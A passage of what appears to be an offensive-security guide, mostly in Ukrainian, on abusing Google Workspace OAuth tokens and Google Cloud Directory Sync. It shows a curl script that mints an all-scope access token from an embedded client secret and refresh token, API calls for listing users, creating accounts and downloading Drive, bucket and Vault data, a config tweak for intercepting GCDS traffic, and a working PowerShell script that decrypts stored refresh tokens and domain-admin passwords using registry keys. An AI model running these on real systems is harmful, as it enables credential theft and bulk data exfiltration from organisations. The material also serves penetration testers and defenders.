https://www.googleapis.com/auth/chromesync
https://www.googleapis.com/auth/chromewebstore.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/cryptauth
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/experimentsandconfigs
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/gcm
https://www.googleapis.com/auth/googlenow
https://www.googleapis.com/auth/googletalk
https://www.googleapis.com/auth/identity.passwords.leak.check
https://www.googleapis.com/auth/ip-protection
https://www.googleapis.com/auth/kid.family.readonly
https://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/kid.permission
https://www.googleapis.com/auth/kids.parentapproval
https://www.googleapis.com/auth/kids.supervision.setup.child
https://www.googleapis.com/auth/lens
https://www.googleapis.com/auth/music
https://www.googleapis.com/auth/nearbydevices-pa
https://www.googleapis.com/auth/nearbypresence-pa
https://www.googleapis.com/auth/nearbysharing-pa
https://www.googleapis.com/auth/peopleapi.readonly
https://www.googleapis.com/auth/peopleapi.readwrite
https://www.googleapis.com/auth/photos
https://www.googleapis.com/auth/photos.firstparty.readonly
https://www.googleapis.com/auth/photos.image.readonly
https://www.googleapis.com/auth/profile.language.read
https://www.googleapis.com/auth/secureidentity.action
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/supportcontent
https://www.googleapis.com/auth/tachyon
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
https://www.googleapis.com/auth/wallet.chrome
```
</details>

–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –Ω–∞–π—Ü—ñ–∫–∞–≤—ñ—à–∏–º, –º–æ–∂–ª–∏–≤–æ, —î:
```c
// OAuth2 scope for access to all Google APIs.
const char kAnyApiOAuth2Scope[] = "https://www.googleapis.com/auth/any-api";
```
–û–¥–Ω–∞–∫ —è –Ω–∞–º–∞–≥–∞–≤—Å—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ —Ü–µ–π –æ–±—Å—è–≥ –¥–ª—è –¥–æ—Å—Ç—É–ø—É –¥–æ gmail –∞–±–æ —Å–ø–∏—Å–∫—É –≥—Ä—É–ø, —ñ —Ü–µ –Ω–µ —Å–ø—Ä–∞—Ü—é–≤–∞–ª–æ, —Ç–æ–º—É —è –Ω–µ –∑–Ω–∞—é, –Ω–∞—Å–∫—ñ–ª—å–∫–∏ —Ü–µ –≤—Å–µ —â–µ –∫–æ—Ä–∏—Å–Ω–æ.

**–û—Ç—Ä–∏–º–∞—Ç–∏ —Ç–æ–∫–µ–Ω –¥–æ—Å—Ç—É–ø—É –∑ —É—Å—ñ–º–∞ —Ü–∏–º–∏ –æ–±—Å—è–≥–∞–º–∏**:

<details>

<summary>Bash-—Å–∫—Ä–∏–ø—Ç –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü—ñ—ó —Ç–æ–∫–µ–Ω–∞ –¥–æ—Å—Ç—É–ø—É –∑ refresh_token –∑ —É—Å—ñ–º–∞ –æ–±—Å—è–≥–∞–º–∏</summary>
```bash
export scope=$(echo "https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
https://www.google.com/accounts/OAuthLogin
https://www.googleapis.com/auth/account.capabilities
https://www.googleapis.com/auth/accounts.programmaticchallenge
https://www.googleapis.com/auth/accounts.reauth
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/aida
https://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/android_checkin
https://www.googleapis.com/auth/any-api
https://www.googleapis.com/auth/assistant-sdk-prototype
https://www.googleapis.com/auth/auditrecording-pa
https://www.googleapis.com/auth/bce.secureconnect
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/cast.backdrop
https://www.googleapis.com/auth/cclog
https://www.googleapis.com/auth/chrome-model-execution
https://www.googleapis.com/auth/chrome-optimization-guide
https://www.googleapis.com/auth/chrome-safe-browsing
https://www.googleapis.com/auth/chromekanonymity
https://www.googleapis.com/auth/chromeosdevicemanagement
https://www.googleapis.com/auth/chromesync
https://www.googleapis.com/auth/chromewebstore.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/cryptauth
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/experimentsandconfigs
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/gcm
https://www.googleapis.com/auth/googlenow
https://www.googleapis.com/auth/googletalk
https://www.googleapis.com/auth/identity.passwords.leak.check
https://www.googleapis.com/auth/ip-protection
https://www.googleapis.com/auth/kid.family.readonly
https://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/kid.permission
https://www.googleapis.com/auth/kids.parentapproval
https://www.googleapis.com/auth/kids.supervision.setup.child
https://www.googleapis.com/auth/lens
https://www.googleapis.com/auth/music
https://www.googleapis.com/auth/nearbydevices-pa
https://www.googleapis.com/auth/nearbypresence-pa
https://www.googleapis.com/auth/nearbysharing-pa
https://www.googleapis.com/auth/peopleapi.readonly
https://www.googleapis.com/auth/peopleapi.readwrite
https://www.googleapis.com/auth/photos
https://www.googleapis.com/auth/photos.firstparty.readonly
https://www.googleapis.com/auth/photos.image.readonly
https://www.googleapis.com/auth/profile.language.read
https://www.googleapis.com/auth/secureidentity.action
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/supportcontent
https://www.googleapis.com/auth/tachyon
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
https://www.googleapis.com/auth/wallet.chrome" | tr '\n' ' ')

curl -s --data "client_id=77185425430.apps.googleusercontent.com" \
--data "client_secret=OTJgUOQcT7lO7GsGZq2G4IlT" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token
```
</details>

–î–µ—è–∫—ñ –ø—Ä–∏–∫–ª–∞–¥–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –¥–µ—è–∫–∏—Ö –∑ —Ü–∏—Ö –æ–±–ª–∞—Å—Ç–µ–π:

<details>

<summary>https://www.googleapis.com/auth/userinfo.email &#x26; https://www.googleapis.com/auth/userinfo.profile</summary>
```bash
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/oauth2/v2/userinfo"

{
"id": "100203736939176354570",
"email": "hacktricks@example.com",
"verified_email": true,
"name": "John Smith",
"given_name": "John",
"family_name": "Smith",
"picture": "https://lh3.googleusercontent.com/a/ACg8ocKLvue[REDACTED]wcnzhyKH_p96Gww=s96-c",
"locale": "en",
"hd": "example.com"
}
```
</details>

<details>

<summary>https://www.googleapis.com/auth/admin.directory.user</summary>
```bash
# List users
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/admin/directory/v1/users?customer=<workspace_id>&maxResults=100&orderBy=email"

# Create user
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"primaryEmail": "newuser@hdomain.com",
"name": {
"givenName": "New",
"familyName": "User"
},
"password": "UserPassword123",
"changePasswordAtNextLogin": true
}' \
"https://www.googleapis.com/admin/directory/v1/users"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/drive</summary>
```bash
# List files
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files?pageSize=10&fields=files(id,name,modifiedTime)&orderBy=name"
{
"files": [
{
"id": "1Z8m5ALSiHtewoQg1LB8uS9gAIeNOPBrq",
"name": "Veeam new vendor form 1 2024.docx",
"modifiedTime": "2024-08-30T09:25:35.219Z"
}
]
}

# Download file
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files/<file-id>?alt=media" \
-o "DownloadedFileName.ext"

# Upload file
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/octet-stream" \
--data-binary @path/to/file.ext \
"https://www.googleapis.com/upload/drive/v3/files?uploadType=media"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/devstorage.read_write</summary>
```bash
# List buckets from a project
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/storage/v1/b?project=<project-id>"

# List objects in a bucket
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/storage/v1/b/<bucket-name>/o?maxResults=10&fields=items(id,name,size,updated)&orderBy=name"

# Upload file to bucket
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/octet-stream" \
--data-binary @path/to/yourfile.ext \
"https://www.googleapis.com/upload/storage/v1/b/<BUCKET_NAME>/o?uploadType=media&name=<OBJECT_NAME>"

# Download file from bucket
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/storage/v1/b/BUCKET_NAME/o/OBJECT_NAME?alt=media" \
-o "DownloadedFileName.ext"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/spreadsheets</summary>
```bash
# List spreadsheets
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files?q=mimeType='application/vnd.google-apps.spreadsheet'&fields=files(id,name,modifiedTime)&pageSize=100"

# Download as pdf
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://www.googleapis.com/drive/v3/files/106VJxeyIsVTkixutwJM1IiJZ0ZQRMiA5mhfe8C5CxMc/export?mimeType=application/pdf" \
-o "Spreadsheet.pdf"

# Create spreadsheet
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"properties": {
"title": "New Spreadsheet"
}
}' \
"https://sheets.googleapis.com/v4/spreadsheets"

# Read data from a spreadsheet
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://sheets.googleapis.com/v4/spreadsheets/<SPREADSHEET_ID>/values/Sheet1!A1:C10"

# Update data in spreadsheet
curl -X PUT \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"range": "Sheet1!A2:C2",
"majorDimension": "ROWS",
"values": [
["Alice Johnson", "28", "alice.johnson@example.com"]
]
}' \
"https://sheets.googleapis.com/v4/spreadsheets/<SPREADSHEET_ID>/values/Sheet1!A2:C2?valueInputOption=USER_ENTERED"

# Append data
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"values": [
["Bob Williams", "35", "bob.williams@example.com"]
]
}' \
"https://sheets.googleapis.com/v4/spreadsheets/SPREADSHEET_ID/values/Sheet1!A:C:append?valueInputOption=USER_ENTERED"
```
</details>

<details>

<summary>https://www.googleapis.com/auth/ediscovery (Google Vault)</summary>

**Google Workspace Vault** - —Ü–µ –¥–æ–¥–∞—Ç–æ–∫ –¥–ª—è Google Workspace, —è–∫–∏–π –Ω–∞–¥–∞—î —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏ –¥–ª—è –∑–±–µ—Ä—ñ–≥–∞–Ω–Ω—è –¥–∞–Ω–∏—Ö, –ø–æ—à—É–∫—É —Ç–∞ –µ–∫—Å–ø–æ—Ä—Ç—É –¥–∞–Ω–∏—Ö –≤–∞—à–æ—ó –æ—Ä–≥–∞–Ω—ñ–∑–∞—Ü—ñ—ó, –∑–±–µ—Ä–µ–∂–µ–Ω–∏—Ö —É —Å–ª—É–∂–±–∞—Ö Google Workspace, —Ç–∞–∫–∏—Ö —è–∫ Gmail, Drive, Chat —Ç–∞ —ñ–Ω—à—ñ.

* **–°–ø—Ä–∞–≤–∞** –≤ Google Workspace Vault - —Ü–µ **–∫–æ–Ω—Ç–µ–π–Ω–µ—Ä**, —è–∫–∏–π –æ—Ä–≥–∞–Ω—ñ–∑–æ–≤—É—î —Ç–∞ –≥—Ä—É–ø—É—î –≤—Å—é —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é, –ø–æ–≤'—è–∑–∞–Ω—É –∑ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ—é —Å–ø—Ä–∞–≤–æ—é, —Ä–æ–∑—Å–ª—ñ–¥—É–≤–∞–Ω–Ω—è–º –∞–±–æ —é—Ä–∏–¥–∏—á–Ω–æ—é —Å–ø—Ä–∞–≤–æ—é. –í—ñ–Ω —Å–ª—É–≥—É—î —Ü–µ–Ω—Ç—Ä–∞–ª—å–Ω–∏–º –≤—É–∑–ª–æ–º –¥–ª—è —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è **–£—Ç—Ä–∏–º–∞–Ω–Ω—è–º–∏**, **–ü–æ—à—É–∫–∞–º–∏** —Ç–∞ **–ï–∫—Å–ø–æ—Ä—Ç–∞–º–∏**, —â–æ —Å—Ç–æ—Å—É—é—Ç—å—Å—è —Ü—ñ—î—ó –∫–æ–Ω–∫—Ä–µ—Ç–Ω–æ—ó –ø—Ä–æ–±–ª–µ–º–∏.
* **–£—Ç—Ä–∏–º–∞–Ω–Ω—è** –≤ Google Workspace Vault - —Ü–µ **–¥—ñ—è –∑–±–µ—Ä–µ–∂–µ–Ω–Ω—è**, —â–æ –∑–∞—Å—Ç–æ—Å–æ–≤—É—î—Ç—å—Å—è –¥–æ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ –∞–±–æ –≥—Ä—É–ø, —â–æ–± **–∑–∞–ø–æ–±—ñ–≥—Ç–∏ –≤–∏–¥–∞–ª–µ–Ω–Ω—é –∞–±–æ –∑–º—ñ–Ω–∞–º** —ó—Ö–Ω—ñ—Ö –¥–∞–Ω–∏—Ö —É —Å–ª—É–∂–±–∞—Ö Google Workspace. –£—Ç—Ä–∏–º–∞–Ω–Ω—è –∑–∞–±–µ–∑–ø–µ—á—É—é—Ç—å –∑–±–µ—Ä–µ–∂–µ–Ω–Ω—è –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –≤ —Ü—ñ–ª—ñ—Å–Ω–æ—Å—Ç—ñ —Ç–∞ –Ω–µ–∑–º—ñ–Ω–Ω–æ—Å—Ç—ñ –ø—Ä–æ—Ç—è–≥–æ–º —Ç—Ä–∏–≤–∞–ª–æ—Å—Ç—ñ —é—Ä–∏–¥–∏—á–Ω–æ—ó —Å–ø—Ä–∞–≤–∏ –∞–±–æ —Ä–æ–∑—Å–ª—ñ–¥—É–≤–∞–Ω–Ω—è.
```bash
# List matters
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://vault.googleapis.com/v1/matters?pageSize=10"

# Create matter
curl -X POST \
-H "Authorization: Bearer $access_token" \
-H "Content-Type: application/json" \
-d '{
"name": "Legal Case 2024",
"description": "Matter for the upcoming legal case involving XYZ Corp.",
"state": "OPEN"
}' \
"https://vault.googleapis.com/v1/matters"

# Get specific matter
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://vault.googleapis.com/v1/matters/<MATTER_ID>"

# List holds in a matter
curl -X GET \
-H "Authorization: Bearer $access_token" \
"https://vault.googleapis.com/v1/matters/<MATTER_ID>/holds?pageSize=10"
```
–ë—ñ–ª—å—à–µ [API –∫—ñ–Ω—Ü–µ–≤–∏—Ö —Ç–æ—á–æ–∫ —É –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü—ñ—ó](https://developers.google.com/vault/reference/rest).

</details>

## GCDS - Google Cloud Directory Sync

–¶–µ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç, —è–∫–∏–π –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –¥–ª—è **—Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑–∞—Ü—ñ—ó –≤–∞—à–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ —Ç–∞ –≥—Ä—É–ø –∞–∫—Ç–∏–≤–Ω–æ–≥–æ –∫–∞—Ç–∞–ª–æ–≥—É –∑ –≤–∞—à–∏–º Workspace** (–∞ –Ω–µ –Ω–∞–≤–ø–∞–∫–∏ –Ω–∞ –º–æ–º–µ–Ω—Ç –Ω–∞–ø–∏—Å–∞–Ω–Ω—è —Ü—å–æ–≥–æ —Ç–µ–∫—Å—Ç—É).

–¶–µ —Ü—ñ–∫–∞–≤–æ, –æ—Å–∫—ñ–ª—å–∫–∏ —Ü–µ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç, —è–∫–∏–π –≤–∏–º–∞–≥–∞—Ç–∏–º–µ **–æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ —Å—É–ø–µ—Ä–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ Workspace —Ç–∞ –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ AD**. –¢–æ–º—É, –º–æ–∂–ª–∏–≤–æ, –π–æ–≥–æ –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –¥–æ–º–µ–Ω–Ω–æ–≥–æ —Å–µ—Ä–≤–µ—Ä–∞, —è–∫–∏–π —á–∞—Å –≤—ñ–¥ —á–∞—Å—É —Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑—É—î –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤.

{% hint style="info" %}
–©–æ–± –≤–∏–∫–æ–Ω–∞—Ç–∏ **MitM** –¥–ª—è –±—ñ–Ω–∞—Ä–Ω–æ–≥–æ —Ñ–∞–π–ª—É **`config-manager.exe`**, –ø—Ä–æ—Å—Ç–æ –¥–æ–¥–∞–π—Ç–µ –Ω–∞—Å—Ç—É–ø–Ω–∏–π —Ä—è–¥–æ–∫ —É —Ñ–∞–π–ª `config.manager.vmoptions`: **`-Dcom.sun.net.ssl.checkRevocation=false`**
{% endhint %}

### GCDS - –î–∏—Å–∫ –¢–æ–∫–µ–Ω–∏ —Ç–∞ –û–±–ª—ñ–∫–æ–≤—ñ –î–∞–Ω—ñ AD

–ë—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª `config-manager.exe` (–æ—Å–Ω–æ–≤–Ω–∏–π –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª GCDS –∑ GUI) –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –∑–±–µ—Ä—ñ–≥–∞—Ç–∏–º–µ –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ Active Directory, —Ç–æ–∫–µ–Ω –æ–Ω–æ–≤–ª–µ–Ω–Ω—è —Ç–∞ –¥–æ—Å—Ç—É–ø —É **xml —Ñ–∞–π–ª—ñ** –≤ –ø–∞–ø—Ü—ñ **`C:\Program Files\Google Cloud Directory Sync`** —É —Ñ–∞–π–ª—ñ –ø—ñ–¥ –Ω–∞–∑–≤–æ—é **`Untitled-1.xml`** –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º. –•–æ—á–∞ –π–æ–≥–æ —Ç–∞–∫–æ–∂ –º–æ–∂–Ω–∞ –∑–±–µ—Ä–µ–≥—Ç–∏ –≤ `Documents` –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –∞–±–æ –≤ **–±—É–¥—å-—è–∫—ñ–π —ñ–Ω—à—ñ–π –ø–∞–ø—Ü—ñ**.

–ë—ñ–ª—å—à–µ —Ç–æ–≥–æ, —Ä–µ—î—Å—Ç—Ä **`HKCU\SOFTWARE\JavaSoft\Prefs\com\google\usersyncapp\ui`** –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –∫–ª—é—á–∞ **`open.recent`** –º—ñ—Å—Ç–∏—Ç—å —à–ª—è—Ö–∏ –¥–æ –≤—Å—ñ—Ö –Ω–µ—â–æ–¥–∞–≤–Ω–æ –≤—ñ–¥–∫—Ä–∏—Ç–∏—Ö –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π–Ω–∏—Ö —Ñ–∞–π–ª—ñ–≤ (xml). –¢–æ–º—É –º–æ–∂–ª–∏–≤–æ **–ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ —Ü–µ, —â–æ–± –∑–Ω–∞–π—Ç–∏ —ó—Ö**.

–ù–∞–π—Ü—ñ–∫–∞–≤—ñ—à–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Ñ–∞–π–ª—É –±—É–¥–µ:
```xml
[...]
<loginMethod>OAUTH2</loginMethod>
<oAuth2RefreshToken>rKvvNQxi74JZGI74u68aC6o+3Nu1ZgVUYdD1GyoWyiHHxtWx+lbx3Nk8dU27fts5lCJKH/Gp1q8S6kEM2AvjQZN16MkGTU+L2Yd0kZsIJWeO0K0RdVaK2D9Saqchk347kDgGsQulJnuxU+Puo46+aA==</oAuth2RefreshToken>
<oAuth2Scopes>
<scope>https://www.google.com/m8/feeds/</scope>
<scope>https://www.googleapis.com/auth/admin.directory.group</scope>
<scope>https://www.googleapis.com/auth/admin.directory.orgunit</scope>
<scope>https://www.googleapis.com/auth/admin.directory.resource.calendar</scope>
<scope>https://www.googleapis.com/auth/admin.directory.user</scope>
<scope>https://www.googleapis.com/auth/admin.directory.userschema</scope>
<scope>https://www.googleapis.com/auth/apps.groups.settings</scope>
<scope>https://www.googleapis.com/auth/apps.licensing</scope>
<scope>https://www.googleapis.com/auth/plus.me</scope>
</oAuth2Scopes>
[...]
<hostname>192.168.10.23</hostname>
<port>389</port>
<basedn>dc=hacktricks,dc=local</basedn>
<authType>SIMPLE</authType>
<authUser>DOMAIN\domain-admin</authUser>
<authCredentialsEncrypted>XMmsPMGxz7nkpChpC7h2ag==</authCredentialsEncrypted>
[...]
```
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —è–∫ **refresh** **token** —Ç–∞ **password** –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ **—à–∏—Ñ—Ä—É—é—Ç—å—Å—è** –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é **AES CBC** –∑ –≤–∏–ø–∞–¥–∫–æ–≤–æ –∑–≥–µ–Ω–µ—Ä–æ–≤–∞–Ω–∏–º –∫–ª—é—á–µ–º —Ç–∞ IV, —è–∫—ñ –∑–±–µ—Ä—ñ–≥–∞—é—Ç—å—Å—è –≤ **`HKEY_CURRENT_USER\SOFTWARE\JavaSoft\Prefs\com\google\usersyncapp\util`** (–¥–µ –± –Ω–µ –∑–±–µ—Ä—ñ–≥–∞–ª–∞ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∞ **`prefs`** Java –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è) —É —Ä—è–¥–∫–æ–≤–∏—Ö –∫–ª—é—á–∞—Ö **`/Encryption/Policy/V2.iv`** —Ç–∞ **`/Encryption/Policy/V2.key`**, –∑–±–µ—Ä–µ–∂–µ–Ω–∏—Ö —É base64.

<details>

<summary>Powershell —Å–∫—Ä–∏–ø—Ç –¥–ª—è —Ä–æ–∑—à–∏—Ñ—Ä–æ–≤–∫–∏ refresh token —Ç–∞ –ø–∞—Ä–æ–ª—è</summary>
```powershell
# Paths and key names
$xmlConfigPath = "C:\Users\c\Documents\conf.xml"
$regPath = "SOFTWARE\JavaSoft\Prefs\com\google\usersyncapp\util"
$ivKeyName = "/Encryption/Policy/V2.iv"
$keyKeyName = "/Encryption/Policy/V2.key"

# Open the registry key
try {
$regKey = [Microsoft.Win32.Registry]::CurrentUser.OpenSubKey($regPath)
if (-not $regKey) {
Throw "Registry key not found: HKCU\$regPath"
}
}
catch {
Write-Error "Failed to open registry key: $_"
exit
}

# Get Base64-encoded IV and Key from the registry
try {
$ivBase64 = $regKey.GetValue($ivKeyName)
$ivBase64 = $ivBase64 -replace '/', ''
$ivBase64 = $ivBase64 -replace '\\', '/'
if (-not $ivBase64) {
Throw "IV not found in registry"
}
$keyBase64 = $regKey.GetValue($keyKeyName)
$keyBase64 = $keyBase64 -replace '/', ''
$keyBase64 = $keyBase64 -replace '\\', '/'
if (-not $keyBase64) {
Throw "Key not found in registry"
}
}
catch {
Write-Error "Failed to read registry values: $_"
exit
}
$regKey.Close()


# Decode Base64 IV and Key
$ivBytes = [Convert]::FromBase64String($ivBase64)
$keyBytes = [Convert]::FromBase64String($keyBase64)

# Read XML content
$xmlContent = Get-Content -Path $xmlConfigPath -Raw

# Extract Base64-encoded encrypted values using regex
$refreshTokenMatch = [regex]::Match($xmlContent, "<oAuth2RefreshToken>(.*?)</oAuth2RefreshToken>")
$refreshTokenBase64 = $refreshTokenMatch.Groups[1].Value

$encryptedPasswordMatch = [regex]::Match($xmlContent, "<authCredentialsEncrypted>(.*?)</authCredentialsEncrypted>")
$encryptedPasswordBase64 = $encryptedPasswordMatch.Groups[1].Value

# Decode encrypted values from Base64
$refreshTokenEncryptedBytes = [Convert]::FromBase64String($refreshTokenBase64)
$encryptedPasswordBytes = [Convert]::FromBase64String($encryptedPasswordBase64)

# Function to decrypt data using AES CBC
Function Decrypt-Data($cipherBytes, $keyBytes, $ivBytes) {
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$aes.KeySize = 256
$aes.BlockSize = 128
$aes.Key = $keyBytes
$aes.IV = $ivBytes

$decryptor = $aes.CreateDecryptor()
$memoryStream = New-Object System.IO.MemoryStream
$cryptoStream = New-Object System.Security.Cryptography.CryptoStream($memoryStream, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
$cryptoStream.Write($cipherBytes, 0, $cipherBytes.Length)
$cryptoStream.FlushFinalBlock()
$plaintextBytes = $memoryStream.ToArray()

$cryptoStream.Close()
$memoryStream.Close()

return $plaintextBytes
}

# Decrypt the values
$refreshTokenBytes = Decrypt-Data -cipherBytes $refreshTokenEncryptedBytes -keyBytes $keyBytes -ivBytes $ivBytes
$refreshToken = [System.Text.Encoding]::UTF8.GetString($refreshTokenBytes)

$decryptedPasswordBytes = Decrypt-Data -cipherBytes $encryptedPasswordBytes -keyBytes $keyBytes -ivBytes $ivBytes
$decryptedPassword = [System.Text.Encoding]::UTF8.GetString($decryptedPasswordBytes)

# Output the decrypted values
Write-Host "Decrypted Refresh Token: $refreshToken"
Write-Host "Decrypted Password: $decryptedPassword"
```
</details>

{% hint style="info" %}
